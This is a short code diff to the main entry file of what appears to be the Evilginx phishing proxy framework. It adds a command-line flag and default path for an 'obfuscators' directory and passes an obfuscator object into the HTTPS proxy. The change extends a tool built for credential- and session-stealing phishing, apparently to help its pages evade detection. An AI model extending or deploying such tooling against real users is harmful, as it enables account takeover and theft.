@@ -20,6 +20,7 @@ import (
 
 var phishlets_dir = flag.String("p", "", "Phishlets directory path")
 var redirectors_dir = flag.String("t", "", "HTML redirector pages directory path")
+var obfuscators_dir = flag.String("o", "", "Obfuscators directory path")
 var debug_log = flag.Bool("debug", false, "Enable debug output")
 var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
 var cfg_dir = flag.String("c", "", "Configuration directory path")
@@ -80,6 +81,15 @@ func main() {
 			}
 		}
 	}
+	if *obfuscators_dir == "" {
+		*obfuscators_dir = joinPath(exe_dir, "./obfuscators")
+		if _, err := os.Stat(*obfuscators_dir); os.IsNotExist(err) {
+			*obfuscators_dir = "/usr/share/evilginx/obfuscators/"
+			if _, err := os.Stat(*obfuscators_dir); os.IsNotExist(err) {
+				*obfuscators_dir = joinPath(exe_dir, "./obfuscators")
+			}
+		}
+	}
 	if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
 		log.Fatal("provided phishlets directory path does not exist: %s", *phishlets_dir)
 		return
@@ -135,6 +145,11 @@ func main() {
 		return
 	}
 
+	ob, err := core.NewObfuscator(*obfuscators_dir)
+	if err != nil {
+		log.Error("obfuscators: %s", err)
+	}
+
 	files, err := os.ReadDir(phishlets_path)
 	if err != nil {
 		log.Fatal("failed to list phishlets directory '%s': %v", phishlets_path, err)
@@ -170,7 +185,7 @@ func main() {
 		return
 	}
 
-	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode)
+	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, ob, *developer_mode)
 	hp.Start()
 
 	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
